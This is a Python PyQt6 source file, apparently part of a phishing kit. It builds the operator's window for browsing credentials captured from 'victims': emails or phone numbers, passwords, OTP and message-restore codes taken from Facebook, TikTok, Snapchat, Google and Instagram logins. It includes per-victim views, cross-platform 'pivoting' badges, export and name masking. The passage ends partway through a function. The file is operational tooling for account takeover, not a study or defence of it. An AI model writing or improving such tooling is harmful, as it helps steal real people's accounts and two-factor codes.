"""credentials.py — auto-generated from Release.py."""

import sys
import os
import time
import threading
import subprocess
import socket
import requests
from werkzeug.serving import make_server
from datetime import datetime
from PyQt6.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton, QLabel, QTextEdit, QGroupBox, QSplitter, QRadioButton, QCheckBox, QFrame, QScrollArea, QDialog, QGridLayout, QTabWidget, QFileDialog, QComboBox, QMenu, QInputDialog, QStyle, QStyleOptionButton, QMessageBox, QListWidget, QListWidgetItem, QAbstractItemView
from PyQt6.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, QVariantAnimation, QAbstractAnimation
from PyQt6.QtGui import QTextCursor, QFont, QColor, QCursor, QPainter
import json
import base64
from routes import app
from config import active_servers, sandbox_config, get_cfg, TARGETS_DIR, BASE_CONFIG, TRASH_DIR, is_target_hidden, set_target_hidden, rename_target_meta, remove_target_meta, mask_name, is_hide_names, is_hide_credentials
from widgets import BounceButton, TextEditorDialog, PublicationDialog, ModernToggleSwitch
from helpers import is_port_in_use, ajouter_log, BANNER_ASCII, log_error

from ._header import BounceButton, QApplication, QComboBox, QEasingCurve, QFileDialog, QFrame, QHBoxLayout, QLabel, QLineEdit, QMessageBox, QPropertyAnimation, QScrollArea, QVBoxLayout, QWidget, Qt, TARGETS_DIR, json, log_error_to_file, os

class CredentialsWindow(QWidget):
    """Modern window to view captured credentials for a specific target (or all)."""

    def __init__(self, main_win, tid=None):
        super().__init__()
        self.setWindowFlag(Qt.WindowType.Window)
        self.setAttribute(Qt.WidgetAttribute.WA_DeleteOnClose, False)
        self.main_win = main_win
        self.tid = tid  # If None, show all targets' credentials
        self.all_blocks = []  # cached parsed blocks
        self.filtered_blocks = []

        if tid:
            self.setWindowTitle(f"🔐 Identifiants capturés — {mask_name(tid)}")
        else:
            self.setWindowTitle("🔐 Identifiants capturés — Toutes les cibles")
        self.setMinimumSize(820, 600)
        self.resize(900, 680)
        self._apply_theme_style()

        layout = QVBoxLayout(self)
        layout.setContentsMargins(18, 18, 18, 18)
        layout.setSpacing(12)

        # ─── Header ───
        header_lay = QHBoxLayout()
        title = QLabel("🔐 Identifiants capturés")
        from theme import get_theme as _gt
        _t = _gt()
        title.setStyleSheet(f"font-size: 20px; font-weight: bold; color: {_t['accent']};")
        header_lay.addWidget(title)
        header_lay.addStretch()
        self.lbl_count = QLabel("0 capture(s)")
        from theme import get_theme as _gt_cnt
        _t_cnt = _gt_cnt()
        self.lbl_count.setStyleSheet(f"color: {_t_cnt['text_dim']}; font-weight: bold; font-size: 13px;")
        header_lay.addWidget(self.lbl_count)
        layout.addLayout(header_lay)

        # ─── Toolbar: search + target filter + view toggle + actions ───
        toolbar = QHBoxLayout()
        toolbar.setSpacing(8)

        # Search box
        self.i_search = QLineEdit()
        self.i_search.setPlaceholderText("🔍 Rechercher (email/numéro, mot de passe, OTP, cible...)")
        self.i_search.textChanged.connect(self._apply_filter)
        toolbar.addWidget(self.i_search, stretch=1)

        # Target filter dropdown
        toolbar.addWidget(QLabel("Cible :"))
        self.combo_filter = QComboBox()
        self.combo_filter.addItem("Toutes les cibles")
        self.combo_filter.currentIndexChanged.connect(self._apply_filter)
        toolbar.addWidget(self.combo_filter)

        # View mode toggle: "Derniers identifiants" (latest per victim) vs "Toutes les captures"
        self.view_mode = "latest"  # default: show only the latest capture per victim
        self.btn_toggle_view = BounceButton("📋 Derniers identifiants")
        self.btn_toggle_view.setToolTip("Basculer entre 'Derniers identifiants par victime' et 'Toutes les captures'")
        from theme import btn_style_accent as _bsa
        self.btn_toggle_view.setStyleSheet(_bsa())
        self.btn_toggle_view.clicked.connect(self._toggle_view_mode)
        toolbar.addWidget(self.btn_toggle_view)

        # ── Hide/Show victim names toggle ──
        # Mirrors the dashboard toggle. When ON, victim names are masked everywhere
        # in this window (cards, dropdown, window title, export).
        self.btn_hide_names = BounceButton("🙈 Noms masqués" if is_hide_names() else "👁️ Noms visibles")
        self.btn_hide_names.clicked.connect(self._toggle_hide_names)
        self._update_hide_names_button_style()
        toolbar.addWidget(self.btn_hide_names)

        # Refresh button
        self.btn_refresh = BounceButton("🔄 Actualiser")
        from theme import btn_style_accent as _bsa2
        self.btn_refresh.setStyleSheet(_bsa2())
        self.btn_refresh.clicked.connect(self.refresh)
        toolbar.addWidget(self.btn_refresh)

        # Migration button — parse legacy credentials.txt and create per-victim JSON
        self.btn_migrate = BounceButton("🔁 Migrer .txt")
        from theme import btn_style_accent as _bsm
        self.btn_migrate.setStyleSheet(_bsm())
        self.btn_migrate.setToolTip("Migre les identifiants du fichier credentials.txt legacy "
                                    "vers le dossier de chaque victime.")
        self.btn_migrate.clicked.connect(self._migrate_from_txt)
        toolbar.addWidget(self.btn_migrate)

        # Export button
        self.btn_export = BounceButton("📥 Exporter (.txt)")
        from theme import btn_style_success as _bss
        self.btn_export.setStyleSheet(_bss())
        self.btn_export.clicked.connect(self._export_txt)
        toolbar.addWidget(self.btn_export)

        # Delete all button
        self.btn_delete_all = BounceButton("🗑️ Tout effacer")
        from theme import btn_style_danger as _bsd
        self.btn_delete_all.setStyleSheet(_bsd())
        self.btn_delete_all.clicked.connect(self._delete_all)
        toolbar.addWidget(self.btn_delete_all)

        layout.addLayout(toolbar)

        # ─── Stats row (compact counts) ───
        stats_lay = QHBoxLayout()
        stats_lay.setSpacing(8)
        self.lbl_emails = self._make_stat_card("📧 Emails/Numéros", "0", "#3b82f6")
        self.lbl_pass = self._make_stat_card("🔑 Mots de passe", "0", "#f59e0b")
        self.lbl_otps = self._make_stat_card("🔢 Codes OTP", "0", "#a855f7")
        self.lbl_complete = self._make_stat_card("✅ Captures complètes", "0", "#22c55e")
        for w in (self.lbl_emails, self.lbl_pass, self.lbl_otps, self.lbl_complete):
            stats_lay.addWidget(w)
        layout.addLayout(stats_lay)

        # ─── Scroll area for credentials cards ───
        self.scroll = QScrollArea()
        self.scroll.setWidgetResizable(True)
        self.scroll_widget = QWidget()
        self.cards_layout = QVBoxLayout(self.scroll_widget)
        self.cards_layout.setContentsMargins(4, 4, 4, 4)
        self.cards_layout.setSpacing(10)
        self.cards_layout.addStretch()
        self.scroll.setWidget(self.scroll_widget)
        layout.addWidget(self.scroll, stretch=1)

        # Initial load (flush pending + migrate from txt, then read disk)
        self.all_blocks = self._initial_load()
        # Populate target filter + rebuild
        if hasattr(self, 'combo_filter') and self.combo_filter is not None:
            self._apply_filter()

    def _make_stat_card(self, label, value, color):
        """Create a small stat card widget."""
        from theme import get_theme as _gt
        _t = _gt()
        card = QFrame()
        card.setStyleSheet(f"""
            QFrame {{
                background-color: {_t['bg_alt']}; border: 1px solid {color};
                border-radius: 10px; padding: 8px;
            }}
        """)
        lay = QVBoxLayout(card)
        lay.setContentsMargins(12, 8, 12, 8)
        lay.setSpacing(2)
        lbl_top = QLabel(label)
        lbl_top.setStyleSheet(f"color: {color}; font-size: 11px; font-weight: bold; background: transparent; border: none;")
        lbl_val = QLabel(value)
        lbl_val.setObjectName("value")
        lbl_val.setStyleSheet(f"color: {_t['text']}; font-size: 22px; font-weight: bold; background: transparent; border: none;")
        lay.addWidget(lbl_top)
        lay.addWidget(lbl_val)
        card._value_label = lbl_val
        return card

    def _apply_theme_style(self):
        """Build and apply the window stylesheet using the current theme colors.
        Called at __init__ and again by refresh_theme() when the theme changes.
        Does NOT modify the window structure — only colors."""
        try:
            from theme import get_theme
            t = get_theme()
            self.setStyleSheet(f"""
                QWidget {{ background-color: {t['bg']}; color: {t['text']}; font-size: 12px; }}
                QLabel {{ color: {t['text']}; }}
                QLineEdit {{
                    background-color: {t['bg_alt']}; border: 1px solid {t['border_hover']};
                    border-radius: 8px; padding: 9px 14px; color: {t['text']};
                    font-size: 13px;
                }}
                QLineEdit:focus {{ border: 1px solid {t['accent']}; }}
                QComboBox {{
                    background-color: {t['bg_alt']}; border: 1px solid {t['border_hover']};
                    border-radius: 8px; padding: 8px 14px; color: {t['text']};
                    font-weight: normal; min-width: 150px;
                }}
                QComboBox::drop-down {{ border: 0px; width: 24px; }}
                QComboBox QAbstractItemView {{
                    background-color: {t['bg']}; border: 1px solid {t['accent']};
                    border-radius: 8px; padding: 6px; outline: none;
                    selection-background-color: {t['accent']}; color: {t['text']};
                }}
                QComboBox QAbstractItemView::item {{
                    padding: 8px 12px; border-radius: 6px; min-height: 20px;
                }}
                QComboBox QAbstractItemView::item:hover {{ background-color: {t['bg_alt']}; color: {t['accent_text']}; }}
                QComboBox QAbstractItemView::item:selected {{ background-color: {t['accent']}; color: white; }}
                QScrollArea {{ border: 1px solid {t['border']}; border-radius: 12px; background: {t['bg']}; }}
                QPushButton {{
                    background-color: {t['bg_alt']}; color: {t['text']}; border: 1px solid {t['border_hover']};
                    border-radius: 8px; padding: 8px 14px; font-weight: normal;
                }}
                QPushButton:hover {{ background-color: {t['border_hover']}; border: 1px solid {t['accent']}; }}
            """)
            # Re-apply individual button stylesheets so they pick up the new theme
            from theme import btn_style_accent, btn_style_success, btn_style_danger, btn_style_neutral
            if hasattr(self, 'btn_toggle_view') and self.btn_toggle_view:
                self.btn_toggle_view.setStyleSheet(btn_style_accent())
            if hasattr(self, 'btn_refresh') and self.btn_refresh:
                self.btn_refresh.setStyleSheet(btn_style_accent())
            if hasattr(self, 'btn_migrate') and self.btn_migrate:
                self.btn_migrate.setStyleSheet(btn_style_accent())
            if hasattr(self, 'btn_export') and self.btn_export:
                self.btn_export.setStyleSheet(btn_style_success())
            if hasattr(self, 'btn_delete_all') and self.btn_delete_all:
                self.btn_delete_all.setStyleSheet(btn_style_danger())
            if hasattr(self, 'btn_hide_names') and self.btn_hide_names:
                self._update_hide_names_button_style()
            if hasattr(self, 'lbl_count') and self.lbl_count:
                self.lbl_count.setStyleSheet(f"color: {t['text_dim']}; font-weight: bold; font-size: 13px;")
            # Refresh cards so they pick up the new theme colors
            try:
                self.refresh()
            except Exception:
                pass
        except Exception as e:
            log_error_to_file('CredentialsWindow._apply_theme_style', e)

    # ─── Loading credentials from per-victim JSON files ───
    def _load_all_sessions(self):
        """Load all capture sessions from disk.

        Flushes pending in-memory captures first so that intermediate
        captures (email + password without final OTP, etc.) are visible.
        Does NOT call migrate_from_txt() to avoid re-creating deleted data.
        """
        try:
            import credentials_manager as cm
            try:
                cm.flush_pending()
            except Exception:
                pass
            if self.tid:
                sessions = cm.get_sessions(self.tid)
            else:
                sessions = cm.get_all_sessions()
            return sessions
        except Exception as e:
            log_error_to_file("CredentialsWindow._load_all_sessions", e)
            log_error("CredentialsWindow._load_all_sessions", e)
            return []

    def _initial_load(self):
        """First load: flush pending sessions + migrate from txt, then read disk.

        Called once at init or when the window is shown. Subsequent refreshes
        use _load_all_sessions() (disk-only) to avoid re-creating deleted data.
        """
        try:
            import credentials_manager as cm
            # Force-write any pending (incomplete) sessions to disk before loading
            try:
                cm.flush_pending()
            except Exception as e:
                log_error_to_file("CredentialsWindow.flush_pending", e)
                log_error("CredentialsWindow.flush_pending", e)

            # One-time migration from legacy credentials.txt
            try:
                result = cm.migrate_from_txt()
                if result.get("errors"):
                    for err in result["errors"][:3]:
                        log_error_to_file("CredentialsWindow.migrate_from_txt", Exception(err))
                        log_error("CredentialsWindow.migrate_from_txt", Exception(err))
            except Exception as e:
                log_error_to_file("CredentialsWindow.migrate_from_txt", e)
                log_error("CredentialsWindow.migrate_from_txt", e)

            return self._load_all_sessions()
        except Exception as e:
            log_error_to_file("CredentialsWindow._initial_load", e)
            log_error("CredentialsWindow._initial_load", e)
            return []

    def _make_target_avatar(self, tid, size=40):
        """Build a round avatar QLabel for a target.
        Cherche d'abord dans le dossier credentials (survit à la corbeille),
        puis dans le JSON de la cible."""
        try:
            if not tid:
                return None
            photo_path = ""
            
            # 1. Chercher d'abord dans le dossier credentials (survit à la corbeille)
            try:
                import credentials_manager as cm
                cred_photo = cm.get_profile_photo_from_credentials(tid)
                if cred_photo:
                    photo_path = cred_photo
            except Exception:
                pass
            
            # 2. Si pas trouvé, chercher dans le JSON de la cible
            if not photo_path:
                try:
                    target_json = os.path.join(TARGETS_DIR, f"{tid}.json")
                    if os.path.exists(target_json):
                        with open(target_json, "r", encoding="utf-8") as f:
                            data = json.load(f)
                            photo_path = data.get("victim_photo") or data.get("target_pic", "")
                except Exception as e:
                    log_error_to_file("CredentialsWindow._make_target_avatar", e)
            
            if not photo_path:
                return None
            if hasattr(self.main_win, 'config_win') and self.main_win.config_win:
                return self.main_win.config_win._make_round_avatar(photo_path, size=size)
            return None
        except Exception as e:
            log_error_to_file("CredentialsWindow._make_target_avatar", e)
            log_error("CredentialsWindow._make_target_avatar", e)
            return None

    def refresh(self):
        """Reload credentials and rebuild the UI."""
        # Guard: combo_filter may not exist yet during __init__ / theme refresh
        if not hasattr(self, 'combo_filter') or self.combo_filter is None:
            return
        try:
            self.all_blocks = self._load_all_sessions()
            # Populate target filter
            self.combo_filter.blockSignals(True)
            current_filter = self.combo_filter.currentText()
            self.combo_filter.clear()
            self.combo_filter.addItem("Toutes les cibles")
            targets_seen = []
            for b in self.all_blocks:
                t = b.get("target", "")
                if t and t not in targets_seen:
                    targets_seen.append(t)
                    # Display masked name in the dropdown, but keep the original
                    # in userData so the filter still matches the real target.
                    self.combo_filter.addItem(mask_name(t), userData=t)
            # Restore selection
            idx = self.combo_filter.findText(current_filter)
            if idx >= 0:
                self.combo_filter.setCurrentIndex(idx)
            self.combo_filter.blockSignals(False)
            self._apply_filter()
        except Exception as e:
            log_error_to_file("CredentialsWindow.refresh", e)
            log_error("CredentialsWindow.refresh", e)

    def _apply_filter(self):
        """Apply search + target filter and rebuild cards (and the latest panel)."""
        try:
            search = self.i_search.text().strip().lower()
            # Use userData (the real target id) — the visible text may be masked.
            target_filter = self.combo_filter.currentData() or self.combo_filter.currentText()
            # Special case: "Toutes les cibles" has no userData → clear the filter
            if self.combo_filter.currentText() == "Toutes les cibles":
                target_filter = ""

            self.filtered_blocks = []
            for b in self.all_blocks:
                # Target filter
                if target_filter and target_filter != "Toutes les cibles":
                    if b.get("target", "") != target_filter:
                        continue
                # If window was opened for a specific tid, restrict to it
                if self.tid and b.get("target", "") != self.tid:
                    continue
                # Search filter
                if search:
                    # Build haystack from all fields, flattening OTPs (which are dicts)
                    otp_values = []
                    for o in b.get("otps", []):
                        if isinstance(o, dict):
                            otp_values.append(o.get("value", ""))
                            otp_values.append(o.get("label", ""))
                        else:
                            otp_values.append(str(o))
                    haystack = " ".join([
                        b.get("target", ""), b.get("date", ""),
                        b.get("email", ""), b.get("password", ""),
                        " ".join(otp_values)
                    ]).lower()
                    if search not in haystack:
                        continue
                self.filtered_blocks.append(b)

            # Sort: most recent first (sessions are already newest-first from credentials_manager)
            # but we keep a stable order here for clarity
            self.filtered_blocks.sort(key=lambda s: s.get("date", ""), reverse=True)

            self._rebuild_cards()
            self._update_stats()
        except Exception as e:
            log_error_to_file("CredentialsWindow._apply_filter", e)
            log_error("CredentialsWindow._apply_filter", e)

    def _toggle_view_mode(self):
        """Toggle between 'latest per victim' and 'all captures' view modes."""
        try:
            if self.view_mode == "latest":
                self.view_mode = "all"
                self.btn_toggle_view.setText("📜 Toutes les captures")
            else:
                self.view_mode = "latest"
                self.btn_toggle_view.setText("📋 Derniers identifiants")
            self._rebuild_cards()
        except Exception as e:
            log_error_to_file("CredentialsWindow._toggle_view_mode", e)
            log_error("CredentialsWindow._toggle_view_mode", e)

    def _toggle_hide_names(self):
        """Toggle the global hide_names flag and refresh this window."""
        try:
            from config import set_hide_names
            new_state = not is_hide_names()
            set_hide_names(new_state)
            self._update_hide_names_button_style()
            # Refresh window title if we're filtered to a specific tid
            if self.tid:
                self.setWindowTitle(f"🔐 Identifiants capturés — {mask_name(self.tid)}")
            else:
                self.setWindowTitle("🔐 Identifiants capturés — Toutes les cibles")
            # Refresh the dropdown + cards so masked names appear/disappear
            self.refresh()
            # Also notify the main dashboard so its button stays in sync
            if hasattr(self, 'main_win') and self.main_win:
                if hasattr(self.main_win, '_update_hide_names_button_style'):
                    try:
                        self.main_win._update_hide_names_button_style()
                    except Exception as e:
                        log_error_to_file("CredentialsWindow._toggle_hide_names.sync_btn", e)
                if hasattr(self.main_win, 'rebuild_target_list'):
                    try:
                        from PyQt6.QtCore import QTimer
                        QTimer.singleShot(0, self.main_win.rebuild_target_list)
                    except Exception as e:
                        log_error_to_file("CredentialsWindow._toggle_hide_names.rebuild", e)
                # Also notify sandbox window if open
                if hasattr(self.main_win, 'sandbox_win') and self.main_win.sandbox_win:
                    try:
                        if hasattr(self.main_win.sandbox_win, 'refresh_for_hide_names'):
                            self.main_win.sandbox_win.refresh_for_hide_names()
                    except Exception as e:
                        log_error_to_file("CredentialsWindow._toggle_hide_names.sandbox", e)
                # Also notify target config window if open
                if hasattr(self.main_win, 'config_win') and self.main_win.config_win:
                    try:
                        if hasattr(self.main_win.config_win, 'refresh_for_hide_names'):
                            self.main_win.config_win.refresh_for_hide_names()
                    except Exception as e:
                        log_error_to_file("CredentialsWindow._toggle_hide_names.config", e)
                # Also notify corbeille window if open
                if hasattr(self.main_win, 'corbeille_win') and self.main_win.corbeille_win:
                    try:
                        if hasattr(self.main_win.corbeille_win, 'refresh_for_hide_names'):
                            self.main_win.corbeille_win.refresh_for_hide_names()
                    except Exception as e:
                        log_error_to_file("CredentialsWindow._toggle_hide_names.corbeille", e)
        except Exception as e:
            log_error_to_file("CredentialsWindow._toggle_hide_names", e)
            log_error("CredentialsWindow._toggle_hide_names", e)

    def _update_hide_names_button_style(self):
        """Update the hide-names toggle button label + color based on current state."""
        try:
            if is_hide_names():
                self.btn_hide_names.setText("🙈 Noms masqués")
                self.btn_hide_names.setStyleSheet("""
                    QPushButton { background-color: #ef4444; color: white; border: none;
                                  border-radius: 8px; padding: 8px 14px; font-weight: bold; }
                    QPushButton:hover { background-color: #dc2626; }
                """)
            else:
                self.btn_hide_names.setText("👁️ Noms visibles")
                self.btn_hide_names.setStyleSheet("""
                    QPushButton { background-color: #1E293B; color: #E2E8F0; border: 1px solid #475569;
                                  border-radius: 8px; padding: 8px 14px; font-weight: bold; }
                    QPushButton:hover { background-color: #334155; }
                """)
        except Exception as e:
            log_error_to_file("CredentialsWindow._update_hide_names_button_style", e)

    def refresh_for_hide_names(self):
        """Called by the dashboard when the global hide_names flag changes,
        so this window picks up the new mask state."""
        try:
            self._update_hide_names_button_style()
            if self.tid:
                self.setWindowTitle(f"🔐 Identifiants capturés — {mask_name(self.tid)}")
            else:
                self.setWindowTitle("🔐 Identifiants capturés — Toutes les cibles")
            self.refresh()
        except Exception as e:
            log_error_to_file("CredentialsWindow.refresh_for_hide_names", e)

    def _get_latest_per_victim(self):
        """Return only the most recent session per victim (filtered_blocks is already sorted newest-first)."""
        try:
            seen_targets = set()
            latest = []
            for b in self.filtered_blocks:
                t = b.get("target", "")
                if t not in seen_targets:
                    seen_targets.add(t)
                    latest.append(b)
            return latest
        except Exception as e:
            log_error_to_file("CredentialsWindow._get_latest_per_victim", e)
            log_error("CredentialsWindow._get_latest_per_victim", e)
            return self.filtered_blocks

    def _update_stats(self):
        """Update the stat cards with filtered counts."""
        try:
            n_emails = sum(1 for b in self.filtered_blocks if b.get("email"))
            n_pass = sum(1 for b in self.filtered_blocks if b.get("password"))
            n_otps = sum(len(b.get("otps", [])) for b in self.filtered_blocks)
            n_complete = sum(1 for b in self.filtered_blocks if b.get("complete"))
            self.lbl_emails._value_label.setText(str(n_emails))
            self.lbl_pass._value_label.setText(str(n_pass))
            self.lbl_otps._value_label.setText(str(n_otps))
            self.lbl_complete._value_label.setText(str(n_complete))
            self.lbl_count.setText(f"{len(self.filtered_blocks)} capture(s)")
        except Exception as e:
            log_error_to_file("CredentialsWindow._update_stats", e)
            log_error("CredentialsWindow._update_stats", e)

    def _rebuild_cards(self):
        """Rebuild the credentials cards in the scroll area.
        In 'latest' mode: only show the most recent capture per victim.
        In 'all' mode: show all captures."""
        try:
            from theme import get_theme as _gt
            _t = _gt()
            # Clear existing
            while self.cards_layout.count():
                item = self.cards_layout.takeAt(0)
                if item.widget():
                    item.widget().deleteLater()
            self.cards_layout.addStretch()

            # Choose which blocks to display based on view mode
            if self.view_mode == "latest":
                blocks_to_show = self._get_latest_per_victim()
            else:
                blocks_to_show = self.filtered_blocks

            if not blocks_to_show:
                empty_text = "📭 Aucun identifiant capturé pour le moment."
                if self.view_mode == "latest":
                    empty_text = "📭 Aucun identifiant capturé."
                else:
                    empty_text = "📭 Aucune capture à afficher (mode 'Toutes les captures')."
                empty = QLabel(empty_text)
                empty.setStyleSheet(f"color: {_t['text_muted']}; font-size: 14px; padding: 40px;")
                empty.setAlignment(Qt.AlignmentFlag.AlignCenter)
                # Insert before the stretch
                self.cards_layout.insertWidget(self.cards_layout.count() - 1, empty)
                return

            for block in blocks_to_show:
                card = self._build_card(block)
                # Insert before the stretch
                self.cards_layout.insertWidget(self.cards_layout.count() - 1, card)
        except Exception as e:
            log_error_to_file("CredentialsWindow._rebuild_cards", e)
            log_error("CredentialsWindow._rebuild_cards", e)

    def _build_card(self, block):
        """Build a single credential card widget."""
        from theme import get_theme as _gt
        _t = _gt()
        card = QFrame()
        complete = block.get("complete", False)
        border_color = _t['success'] if complete else _t['warning']
        card.setStyleSheet(f"""
            QFrame {{
                background-color: {_t['bg_alt']};
                border: 1px solid {border_color};
                border-left: 4px solid {border_color};
                border-radius: 10px;
            }}
        """)
        lay = QVBoxLayout(card)
        lay.setContentsMargins(16, 12, 16, 12)
        lay.setSpacing(8)

        # ── Card header: avatar + target + date + status badge + delete button ──
        header = QHBoxLayout()
        header.setSpacing(10)

        # Target avatar (round photo) — read from the target's JSON config
        target_tid = block.get("target", "")
        avatar = self._make_target_avatar(target_tid, size=40)
        if avatar:
            header.addWidget(avatar)

        target_lbl = QLabel(f"🎯 {mask_name(target_tid) or 'Inconnu'}")
        target_lbl.setStyleSheet(f"font-size: 15px; font-weight: bold; color: {_t['text']}; background: transparent; border: none;")
        header.addWidget(target_lbl)

        _platform_id = (block.get("platform") or "facebook").lower().strip()
        _platform_meta = {
            "facebook":  ("📘 Facebook",  "#1877f2"),
            "tiktok":    ("🎵 TikTok",    "#fe2c55"),
            "snapchat":  ("👻 Snapchat",  "#fffc00"),
            "google":    ("🔍 Google",    "#1a73e8"),
            "instagram": ("📷 Instagram", "#d62976"),
        }
        _p_label, _p_color = _platform_meta.get(_platform_id, ("📘 Facebook", "#1877f2"))
        _text_color = "#000000" if _platform_id == "snapchat" else "#ffffff"
        platform_badge = QLabel(_p_label)
        platform_badge.setStyleSheet(f"""
            QLabel {{
                background-color: {_p_color};
                color: {_text_color};
                border-radius: 10px;
                padding: 3px 10px;
                font-size: 10px;
                font-weight: bold;
                border: none;
            }}
        """)
        platform_badge.setToolTip(f"Plateforme : {_p_label}")
        header.addWidget(platform_badge)

        # ── Flèche de pivoting (si source_platform existe) ──
        _source_platform = (block.get("source_platform") or "").lower().strip()
        if _source_platform and _source_platform != _platform_id:
            _sp_label, _sp_color = _platform_meta.get(_source_platform, ("📘 Facebook", "#1877f2"))
            _sp_text_color = "#000000" if _source_platform == "snapchat" else "#ffffff"

            # Badge plateforme source
            source_badge = QLabel(_sp_label)
            source_badge.setStyleSheet(f"""
                QLabel {{
                    background-color: {_sp_color};
                    color: {_sp_text_color};
                    border-radius: 10px;
                    padding: 3px 10px;
                    font-size: 10px;
                    font-weight: bold;
                    border: none;
                    opacity: 0.7;
                }}
            """)
            source_badge.setToolTip(f"Plateforme d'origine (pivoting) : {_sp_label}")
            header.addWidget(source_badge)

            # Flèche entre les deux
            arrow_lbl = QLabel("→")
            arrow_lbl.setStyleSheet(f"color: {_t['text']}; font-size: 16px; font-weight: bold; background: transparent; border: none;")
            arrow_lbl.setToolTip(f"Pivoting : {_sp_label} → {_p_label}")
            header.addWidget(arrow_lbl)

        header.addStretch()

        date_lbl = QLabel(f"🕐 {block.get('date', '')}")
        date_lbl.setStyleSheet(f"color: {_t['text_muted']}; font-size: 11px; background: transparent; border: none;")
        header.addWidget(date_lbl)

        # Status badge
        if complete:
            status = QLabel("✓ Complet")
            status.setStyleSheet("""
                QLabel { background-color: #22c55e; color: white; border-radius: 10px;
                         padding: 3px 10px; font-size: 10px; font-weight: bold; }
            """)
        else:
            status = QLabel("⏳ En attente OTP")
            status.setStyleSheet("""
                QLabel { background-color: #f59e0b; color: white; border-radius: 10px;
                         padding: 3px 10px; font-size: 10px; font-weight: bold; }
            """)
        header.addWidget(status)

        # Delete button for this session — uses DATE (unique per session) not index
        block_date = block.get("date", "")
        block_target = block.get("target", "")
        btn_delete = QPushButton("X")
        btn_delete.setObjectName("cred_del_btn")
        btn_delete.setFixedSize(36, 36)
        btn_delete.setCursor(Qt.CursorShape.PointingHandCursor)
        btn_delete.setToolTip("Supprimer cette capture")
        btn_delete.setStyleSheet("""
            QWidget#cred_del_btn { padding: 0px; margin: 0px; border: none; }
            QPushButton#cred_del_btn {
                background-color: #7f1d1d; color: #ffffff; border: none;
                border-radius: 8px; font-size: 16px; font-weight: bold;
                padding: 0px; margin: 0px; min-width: 36px; min-height: 36px;
            }
            QPushButton#cred_del_btn:hover { background-color: #dc2626; }
            QPushButton#cred_del_btn:pressed { background-color: #991b1b; }
        """)
        btn_delete.clicked.connect(lambda checked, t=block_target, d=block_date: self._delete_session(t, d))
        header.addWidget(btn_delete)
        lay.addLayout(header)

        # ── Credentials rows ───
        # Email/Numéro row
        if block.get("email"):
            email_row = self._make_cred_row("📧 Email/Numéro", block["email"], "#3b82f6")
            lay.addWidget(email_row)
        # Password row
        if block.get("password"):
            pass_row = self._make_cred_row("🔑 Mot de passe", block["password"], "#f59e0b")
            lay.addWidget(pass_row)
        # OTP rows (otps are now dicts: {label, value, date})
        for i, otp in enumerate(block.get("otps", []), 1):
            # Handle both dict format (new) and string format (legacy fallback)
            if isinstance(otp, dict):
                otp_value = otp.get("value", "")
                otp_label = otp.get("label", f"OTP {i}")
                # Use the original label (e.g. "OTP 1", "FINAL OTP 1") for clarity
                display_label = f"🔢 {otp_label}" if "FINAL" not in otp_label.upper() else f"✅ {otp_label}"
            else:
                otp_value = str(otp)
                display_label = f"🔢 OTP {i}"
            otp_row = self._make_cred_row(display_label, otp_value, "#a855f7" if "FINAL" not in display_label else "#22c55e")
            lay.addWidget(otp_row)

        # ── Message restore code rows ──
        # Affiché UNIQUEMENT si des codes ont été capturés (comme pour les OTP).
        # Si aucun code n'a été capturé (option désactivée ou pas encore saisi),
        # aucune ligne n'est affichée.
        msg_restore_entries = block.get("message_restore", [])
        if msg_restore_entries:
            for i, mr in enumerate(msg_restore_entries, 1):
                if isinstance(mr, dict):
                    mr_value = mr.get("value", "")
                    mr_label = mr.get("label", f"MSG RESTORE {i}")
                    display_label = f"💬 {mr_label}" if "FINAL" not in mr_label.upper() else f"✅ {mr_label}"
                else:
                    mr_value = str(mr)
                    display_label = f"💬 MSG RESTORE {i}"
                mr_row = self._make_cred_row(display_label, mr_value, "#9b59b6" if "FINAL" not in display_label else "#22c55e")
                lay.addWidget(mr_row)

        return card

    def _delete_session(self, tid, date_str):
        """Delete a specific capture session by its date (unique per session)."""
        try:
            import credentials_manager as cm
            reply = QMessageBox.question(
                self, "Supprimer la capture",
                f"Supprimer cette capture de '{tid}' ?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                QMessageBox.StandardButton.No
            )
            if reply != QMessageBox.StandardButton.Yes:
                return
            ok = cm.delete_session_by_date(tid, date_str)
            if not ok:
                QMessageBox.warning(self, "Suppression",
                    f"Capture introuvable pour '{tid}' (date: {date_str}).\n"
                    f"Elle a peut-être déjà été supprimée.")
            self.refresh()
        except Exception as e:
            log_error_to_file("CredentialsWindow._delete_session", e)
            log_error("CredentialsWindow._delete_session", e)
            QMessageBox.critical(self, "Erreur", f"Erreur lors de la suppression : {e}")

    def _delete_target(self, tid):
        """Delete all capture sessions for a target."""
        try:
            import credentials_manager as cm
            reply = QMessageBox.question(
                self, "Supprimer toutes les captures",
                f"Supprimer TOUTES les captures de '{tid}' ?\nCette action est irréversible.",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                QMessageBox.StandardButton.No
            )
            if reply != QMessageBox.StandardButton.Yes:
                return
            cm.delete_target(tid)
            self.refresh()
        except Exception as e:
            log_error_to_file("CredentialsWindow._delete_target", e)
            log_error("CredentialsWindow._delete_target", e)
            QMessageBox.critical(self, "Erreur", f"Erreur lors de la suppression : {e}")

    def _delete_all(self):
        """Delete all captured credentials for all targets."""
        try:
            import credentials_manager as cm
            reply = QMessageBox.question(
                self, "Tout supprimer",
                "Supprimer DÉFINITIVEMENT tous les identifiants capturés de TOUTES les cibles ?\n"
                "⚠️ Cette action est IRRÉVERSIBLE.",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                QMessageBox.StandardButton.No
            )
            if reply != QMessageBox.StandardButton.Yes:
                return
            count = cm.delete_all()
            self.refresh()
            QMessageBox.information(self, "Suppression", f"{count} fichier(s) supprimé(s).")
        except Exception as e:
            log_error_to_file("CredentialsWindow._delete_all", e)
            log_error("CredentialsWindow._delete_all", e)
            QMessageBox.critical(self, "Erreur", f"Erreur lors de la suppression : {e}")

    def _make_cred_row(self, label, value, color):
        """Build a single credential row (label + value + copy button).
        The copy button is given generous spacing so it doesn't feel cramped.
        When 'hide_credentials' is enabled globally, the value is masked
        (●●●●●●●●) and a '👁️ Voir' button is added in front of the copy button
        to reveal/hide the value on demand."""
        from theme import get_theme as _gt
        _t = _gt()
        row = QFrame()
        row.setStyleSheet(f"""
            QFrame {{ background-color: {_t['bg']}; border-radius: 8px; border: none; }}
        """)
        rl = QHBoxLayout(row)
